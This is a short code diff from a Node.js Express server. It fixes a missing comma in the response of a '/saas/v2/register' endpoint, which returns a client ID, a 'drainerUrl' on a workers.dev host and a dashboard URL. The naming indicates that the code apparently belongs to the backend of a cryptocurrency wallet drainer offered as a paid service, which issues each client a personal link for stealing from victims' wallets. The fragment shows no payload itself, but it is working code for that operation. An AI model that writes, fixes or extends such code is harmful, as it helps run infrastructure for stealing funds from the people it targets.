@@ -563,7 +563,7 @@ app.post('/saas/v2/register', (req, res) => {
       success: true,
       clientId: clientId,
       drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-      dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`
+      dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`,
       message: 'Client registered successfully'
     });
     
